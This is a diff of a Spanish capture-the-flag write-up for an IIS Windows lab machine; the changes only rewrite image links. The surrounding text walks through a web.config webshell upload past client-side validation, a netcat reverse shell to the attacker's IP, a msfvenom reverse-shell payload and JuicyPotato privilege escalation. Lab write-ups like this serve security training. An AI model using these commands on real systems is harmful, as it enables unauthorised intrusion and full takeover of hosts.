@@ -6,7 +6,7 @@ img: /assets/img/obssesion/1.png
 tags: [Windows, Web, ISS, JuicyPotato, reverse shell]
 ---
 
-![[Pasted image 20260725200541.png]]
+![](/secnotes/assets/img/windows/ensala/Pasted image 20260725200541.png)
 
 [Link Descarga](https://labs.thehackerslabs.com/machine/34)
 Plataforma: The Hacker Labs
@@ -16,8 +16,11 @@ OS: Windows
 
 Usamos la herramienta **Auto-Recon** para automatizar esta fase y obtener información de interés.
 
-![[Pasted image 20260725211518.png]]![[Pasted image 20260725211555.png]]
-![[Pasted image 20260725211622.png]]
+![](/secnotes/assets/img/windows/ensala/Pasted image 20260725211518.png)
+
+![](/secnotes/assets/img/windows/ensala/Pasted image 20260725211555.png)
+
+![](/secnotes/assets/img/windows/ensala/Pasted image 20260725211622.png)
 
 Como vimos anteriormente, los puertos **Microsoft Windows RPC**, son puertos dinámicos del sistema.
 
@@ -30,7 +33,7 @@ Muestra superficie de ataque se centrará en los puertos:
 
 Primero intentamos sobre el servicio SMB con `smbclient`
 
-![[Pasted image 20260725212943.png]]
+![](/secnotes/assets/img/windows/ensala/Pasted image 20260725212943.png)
 
 Pero el servidor nos indica que a pesar de permite la autenticación anónima, ningún recurso es compartido para un usuario son privilegios. 
 
@@ -40,13 +43,13 @@ Ya que no pudimos obtener información sobre este servicio, saltaremos al servic
 gobuster dir -u http://192.168.192.167/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x aspx,asp,config,txt,ashx,bak -t 40
 ```
 
-![[Pasted image 20260725213742.png]]
+![](/secnotes/assets/img/windows/ensala/Pasted image 20260725213742.png)
 
 este nos devuelve un resultado con status: 200, y que al acceder a él, nos encontramos con un apartado que nos permite subir archivos al sistema.
 
-![[Pasted image 20260725213810.png]]
+![](/secnotes/assets/img/windows/ensala/Pasted image 20260725213810.png)
 
-![[Pasted image 20260725220625.png]]
+![](/secnotes/assets/img/windows/ensala/Pasted image 20260725220625.png)
 
 ```
 
@@ -83,17 +86,17 @@ Si analizamos el código fuente  del formulario web, hay un detalle critico en l
 
 Existe una función JavaScript en el lado del cliente llamada `ValidateFile()` que se ejecuta justo cuando le hacemos clic a upload. Esta función es la encargada de verificar la extensión del archivo antes de enviarlo al servidor.
 
-![[Pasted image 20260725223809.png]]
+![](/secnotes/assets/img/windows/ensala/Pasted image 20260725223809.png)
 
 Como dato, también encontramos un comentario sobre el código fuente.  
 
-![[Pasted image 20260725223930.png]]
-![[Pasted image 20260725223952.png]]
+![](/secnotes/assets/img/windows/ensala/Pasted image 20260725223930.png)
+![](/secnotes/assets/img/windows/ensala/Pasted image 20260725223952.png)
 
 Podemos ver que esta ruta nos lleva a un archivo inexistente llamado web.config u luego de investigar un poco en la red, encontramos información por parte de `hacktriks` que nos puede servir.
 
 [ISS - Internet Information Service](https://hacktricks.wiki/es/network-services-pentesting/pentesting-web/iis-internet-information-services.html)
-![[Pasted image 20260725222918.png]]
+![](/secnotes/assets/img/windows/ensala/Pasted image 20260725222918.png)
 
 Entonces...
 
@@ -105,9 +108,9 @@ Y justamente encontramos la configuración para una webshell para el servicio IS
 
 Primero nos creamos el archivo web.config en nuestra máquina atacante, y pegamos el código que encontramos en `PayloadAllTheThings`, luego subimos el archivo al servidor ISS objetivo, y por último entramos a la ruta `/Subiditosdetono/web.config` y obtenemos la webshell funcional.
 
-![[Pasted image 20260725225904.png]]
+![](/secnotes/assets/img/windows/ensala/Pasted image 20260725225904.png)
 
-![[Pasted image 20260725225919.png]]
+![](/secnotes/assets/img/windows/ensala/Pasted image 20260725225919.png)
 
 Ya que tenemos acceso al sistema vamos a hacer unos pasos para obtener una reverse shell directamente en nuestra terminal.
 
@@ -127,9 +130,9 @@ Ya que tenemos acceso al sistema vamos a hacer unos pasos para obtener una rever
 
 `\\<NUESTRA IP>\sharedFolder\nc.exe -e cmd <NUESTRA IP> 443`
 
-![[Pasted image 20260725231621.png]]
+![](/secnotes/assets/img/windows/ensala/Pasted image 20260725231621.png)
 
-![[Pasted image 20260725231630.png]]
+![](/secnotes/assets/img/windows/ensala/Pasted image 20260725231630.png)
 
 ### Explicación detallada de los pasos anteriores
 
@@ -156,10 +159,10 @@ En nuestro sistema utilizamos  `rlwrap`, un emulador de terminal que añade hist
 
 Ya que estamos dentro de la máquina víctima tenemos acceso a algunos archivos de un usuario llamado `info`. La forma de verificar los privilegios de nuestro usuario es con el comando `whoami /priv`
 
-![[Pasted image 20260725234216.png]]
+![](/secnotes/assets/img/windows/ensala/Pasted image 20260725234216.png)
 
 si buscamos este privilegio encontramos esta información:
-![[Pasted image 20260725234350.png]]
+![](/secnotes/assets/img/windows/ensala/Pasted image 20260725234350.png)
 
 Para explotar este privilegio podemos utilizar la herramienta `JuicyPotato` 
 
@@ -167,13 +170,13 @@ Para explotar este privilegio podemos utilizar la herramienta `JuicyPotato`
 
 Ahora con el comando `copy`, nos copiaremos el archivo `JuicyPotato.exe` a la carpeta temporal de la víctima (debemos recordar que el archivo JuicyPotato debe estar en el directorio donde levantamos el servidor SMB con el archivo **nc.exe**. 
 
-![[Pasted image 20260725235456.png]]
+![](/secnotes/assets/img/windows/ensala/Pasted image 20260725235456.png)
 
 Por último nos crearemos una reverse shell con `nsfvenom` y la copiaremos en la carpeta temporal igual que el archivo anterior.
 
 `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.192.139 LPORT=4444 -f exe -o rshell.exe`
 
-![[Pasted image 20260725235844.png]]
+![](/secnotes/assets/img/windows/ensala/Pasted image 20260725235844.png)
 
 Ponemos el puerto 4444 en escucha. 
 
@@ -199,8 +202,8 @@ Para ejecutar `JuicyPotato` debemos agregarle algunos argumentos:
 
 El resultado...
 
-![[Pasted image 20260726003217.png]]
+![](/secnotes/assets/img/windows/ensala/Pasted image 20260726003217.png)
 
 Una escalada de privilegios y el control total de la víctima.
 
-![[Pasted image 20260726003444.png]]
+![](/secnotes/assets/img/windows/ensala/Pasted image 20260726003444.png)
